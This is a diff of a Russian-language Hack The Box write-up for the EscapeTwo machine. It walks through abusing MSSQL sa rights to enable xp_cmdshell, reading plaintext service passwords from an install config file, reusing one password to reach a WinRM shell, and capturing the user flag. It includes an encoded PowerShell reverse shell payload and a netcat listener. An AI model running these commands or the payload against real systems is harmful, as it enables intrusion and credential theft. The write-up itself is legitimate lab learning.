@@ -231,14 +231,14 @@ session setup failed: NT_STATUS_LOGON_FAILURE
 
 Если обратить внимание на пароль пользователя `sa`, интуитивно мы можем понять, что через него мы можем подключиться к **MSSQL** (1433 порт)
 ```
-Hexada@hexada ~/app/pentesting-tools/NetExec/nxc$ poetry run python3 netexec.py mssql escape.two.htb -u sa -p MSSQLP@ssw0rd! --local-auth -M mssql_priv                               main
+Hexada@hexada ~/app/pentesting-tools/NetExec/nxc$ poetry run python3 netexec.py mssql escape.two.htb -u sa -p MSSQLP@***** --local-auth -M mssql_priv                               main
 
 MSSQL       10.10.11.51     1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:sequel.htb)
 MSSQL       10.10.11.51     1433   DC01             [+] DC01\sa:MSSQLP@***** (Pwn3d!)
 MSSQL_PRIV  10.10.11.51     1433   DC01             [+] sa is already a sysadmin
 ```
 
-Мы можем увидеть, что у нас есть права **sysadmin**, `sa is already a sysadmin`, поэтому нас интересует `xp_cmdshell`, это расширенная хранимая процедура в Microsoft SQL Server, которая позволяет запускать операционные системные команды и выполнять их через SQL Server, таким образом, так как у нас есть права администратора базы данных, мы можем через неё выполнять различные вредоносные команды, в том числе **reverse shell**
+Мы можем увидеть, что у нас есть права **sysadmin**, `sa is already a sysadmin`, поэтому нас интересует `xp_cmdshell`, это расширенная хранимая процедура в **Microsoft SQL Server**, которая позволяет запускать операционные системные команды и выполнять их через **SQL Server**, таким образом, так как у нас есть права администратора базы данных, мы можем через неё выполнять различные вредоносные команды через **power shell**, в том числе **reverse shell**, в данном случае его можно использовать, но мы сделаем немного по проще, но вариант с **reverse shell** я считаю тоже будет полезно рассмотреть
 ```
 Hexada@hexada ~/app/escape-two$ mssqlclient.py sa@10.10.11.51 -p 1433                                                                                                               130 ↵  
 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
@@ -278,7 +278,206 @@ INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from
 SQL (sa  dbo@msdb)> RECONFIGURE
 ```
 
-Замечательно, теперь нам нужно получить доступ к хосту, с помощью **reverse shell**
 ```
+SQL (sa  dbo@master)> EXEC xp_cmdshell 'whoami';
+output           
+--------------   
+sequel\sql_svc   
+
+NULL
+```
+
+Замечательно, теперь мы можем выполнять **power shell** комадны от лица `sql_svc`
+```
+SQL (sa  dbo@master)> EXEC xp_cmdshell 'dir C:\'
+output                                                       
+----------------------------------------------------------   
+ Volume in drive C has no label.                             
+ Volume Serial Number is 3705-289D                           
+
+NULL                                                         
+ Directory of C:\                                            
+
+NULL                                                         
+11/05/2022  11:03 AM    <DIR>          PerfLogs              
+01/04/2025  07:11 AM    <DIR>          Program Files         
+06/09/2024  07:37 AM    <DIR>          Program Files (x86)   
+06/08/2024  02:07 PM    <DIR>          SQL2019               
+06/09/2024  05:42 AM    <DIR>          Users                 
+01/04/2025  08:10 AM    <DIR>          Windows               
+
+               0 File(s)              0 bytes                
+               6 Dir(s)   3,677,212,672 bytes free           
+
+NULL  
+```
+
+На данном этапе, нас интересует папка `SQL2019`, а если точней - логи и файлы конфигурации **Microsoft SQL Server**
+```
+SQL (sa  dbo@master)> EXEC xp_cmdshell 'dir C:\SQL2019'
+output                                                  
+-----------------------------------------------------   
+ Volume in drive C has no label.                        
+ Volume Serial Number is 3705-289D                      
+
+NULL                                                    
+ Directory of C:\SQL2019                                
+
+NULL                                                    
+06/08/2024  02:07 PM    <DIR>          .                
+06/08/2024  02:07 PM    <DIR>          ..               
+01/03/2025  07:29 AM    <DIR>          ExpressAdv_ENU   
+
+               0 File(s)              0 bytes           
+               3 Dir(s)   3,749,613,568 bytes free      
+
+NULL
+```
+
+```
+SQL (sa  dbo@master)> EXEC xp_cmdshell 'dir C:\SQL2019\ExpressAdv_ENU\'
+output                                                            
+---------------------------------------------------------------   
+ Volume in drive C has no label.                                  
+ Volume Serial Number is 3705-289D                                
+
+NULL                                                              
+ Directory of C:\SQL2019\ExpressAdv_ENU                           
+
+NULL                                                              
+01/03/2025  07:29 AM    <DIR>          .                          
+01/03/2025  07:29 AM    <DIR>          ..                         
+06/08/2024  02:07 PM    <DIR>          1033_ENU_LP                
+09/24/2019  09:03 PM                45 AUTORUN.INF                
+09/24/2019  09:03 PM               788 MEDIAINFO.XML              
+06/08/2024  02:07 PM                16 PackageId.dat              
+06/08/2024  02:07 PM    <DIR>          redist                     
+06/08/2024  02:07 PM    <DIR>          resources                  
+09/24/2019  09:03 PM           142,944 SETUP.EXE                  
+09/24/2019  09:03 PM               486 SETUP.EXE.CONFIG           
+06/08/2024  02:07 PM               717 sql-Configuration.INI      
+09/24/2019  09:03 PM           249,448 SQLSETUPBOOTSTRAPPER.DLL   
+06/08/2024  02:07 PM    <DIR>          x64                        
+               7 File(s)        394,444 bytes                     
+               6 Dir(s)   3,707,465,728 bytes free                
+
+NULL
+```
+
+```
+SQL (sa  dbo@master)> EXEC xp_cmdshell 'type C:\SQL2019\ExpressAdv_ENU\sql-Configuration.INI';
+output                                              
+-------------------------------------------------   
+[OPTIONS]                                           
+ACTION="Install"                                    
+QUIET="True"                                        
+FEATURES=SQL                                        
+INSTANCENAME="SQLEXPRESS"                           
+INSTANCEID="SQLEXPRESS"                             
+RSSVCACCOUNT="NT Service\ReportServer$SQLEXPRESS"   
+AGTSVCACCOUNT="NT AUTHORITY\NETWORK SERVICE"        
+AGTSVCSTARTUPTYPE="Manual"                          
+COMMFABRICPORT="0"                                  
+COMMFABRICNETWORKLEVEL=""0"                         
+COMMFABRICENCRYPTION="0"                            
+MATRIXCMBRICKCOMMPORT="0"                           
+SQLSVCSTARTUPTYPE="Automatic"                       
+FILESTREAMLEVEL="0"                                 
+ENABLERANU="False"                                  
+SQLCOLLATION="SQL_Latin1_General_CP1_CI_AS"         
+SQLSVCACCOUNT="SEQUEL\sql_svc"                      
+SQLSVCPASSWORD="WqSZAF*****"                   
+SQLSYSADMINACCOUNTS="SEQUEL\Administrator"          
+SECURITYMODE="SQL"                                  
+SAPWD="MSSQLP@*****"                              
+ADDCURRENTUSERASSQLADMIN="False"                    
+TCPENABLED="1"                                      
+NPENABLED="1"                                       
+BROWSERSVCSTARTUPTYPE="Automatic"                   
+IAcceptSQLServerLicenseTerms=True                   
+
+NULL        
+```
+
+Замечательно, мы получили пароль от учетной записи `sql_svc`, но на этом моменте, хочу обсудить две вещи, с которыми у меня были проблемы:
+
+1. В части документации, где мы включаем `xp_cmdshell`, я упоминал про **reverse shell*. Когда я взламывал эту машину, у меня были проблемы с этим этапом, и мне пришлось идти в интернет, искать документации по взлому этой машины, и во всех других документаций дальнейший взлом происходил через **reverse shell**
+
+![image](https://github.com/user-attachments/assets/5a7db1a9-8c40-4f60-899d-066dd179ce39)
+
+либо так
+
+![image](https://github.com/user-attachments/assets/b0bb835b-4b47-49a4-98a1-81265f87eb7b)
+
+о про второй способ я только сейчас узнал
+
+У меня с этим были проблемы, я использовал разные **reverse shell** скрипты, чтоб получить доступ к хосту, но у меня возникала одна и та же проблема, скрипт брал тут https://www.revshells.com/
+```
+SQL (sa  dbo@master)> EXEC xp_cmdshell 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAIgAsADkAMAAwADEAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA';
+output                                                                                                                                                                                                                                                            
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+```
+
+```
+Hexada@hexada ~/Downloads$ nc -nvlp 9001                                                                                                                                  1 ↵  
+Connection from 10.10.11.51:49869
+
+... дальше ничего не происходит ...
+```
+
+Эту проблему я до сих пор не решил, к сожалению, пришлось использовать другую альтернативу отказавшись от полезного практического опыта: я и так потратил на это много времени 
+
+2. Еще один момент связан с `sql_svc`, так как на этом моменте я тоже застрял, и долго не знал что делать, мне сново пришлось лесть в интернет, искать что делать дальше, оказалось, что нам нужно было посмотреть, есть ли учетные записи, у которых пароль, такой же как и у `sql_svc`
+   
+![image](https://github.com/user-attachments/assets/f3c70208-9e8a-4579-8893-eed14255bd83)
+
+Таким образом, у учетной записи `ryan` такой же пароль, как и у `sql_svc`, и дальнейший взлом мы продолжаем через неё
+```
+Hexada@hexada ~/app/pentesting-tools/NetExec/nxc$ evil-winrm -i escape.two.htb -u ryan -p WqSZAF6CysDQbGb3                                                                        1 ↵ main 
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\ryan\Documents> ls
+*Evil-WinRM* PS C:\Users\ryan\Documents> cd ..
+*Evil-WinRM* PS C:\Users\ryan> ls
+
+    Directory: C:\Users\ryan
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-r---         6/9/2024   4:24 AM                Desktop
+d-r---         1/6/2025   5:32 AM                Documents
+d-r---        9/15/2018  12:19 AM                Downloads
+d-r---        9/15/2018  12:19 AM                Favorites
+d-r---        9/15/2018  12:19 AM                Links
+d-r---        9/15/2018  12:19 AM                Music
+d-r---        9/15/2018  12:19 AM                Pictures
+d-----        9/15/2018  12:19 AM                Saved Games
+d-r---        9/15/2018  12:19 AM                Videos
+
+
+*Evil-WinRM* PS C:\Users\ryan> cd Desktop
+*Evil-WinRM* PS C:\Users\ryan\Desktop> ls
+
+
+    Directory: C:\Users\ryan\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---        1/27/2025   7:19 AM             34 user.txt
+
+*Evil-WinRM* PS C:\Users\ryan\Desktop> more user.txt
+89f5090e4536a1c8d3634ddc0a2ae4d9
+```
+
+Поздавляю, мы получили **User Flag**!!!
+
+---
 
 
